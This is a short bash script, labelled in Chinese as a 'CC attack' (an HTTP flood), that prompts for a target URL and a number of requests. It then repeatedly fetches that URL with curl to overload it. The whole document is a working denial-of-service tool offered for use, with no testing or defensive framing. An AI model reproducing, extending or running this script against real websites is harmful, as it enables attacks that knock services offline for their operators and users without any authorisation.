#!/bin/bash
echo ----CC攻击----
read -p "请输入攻击地址" url
read -p "请输入攻击数量:" sl
echo 正在攻击ing...
for ((i=0; i<$sl; i++)); do

curl -s $url > /dev/null

done
echo "CC攻击完成"
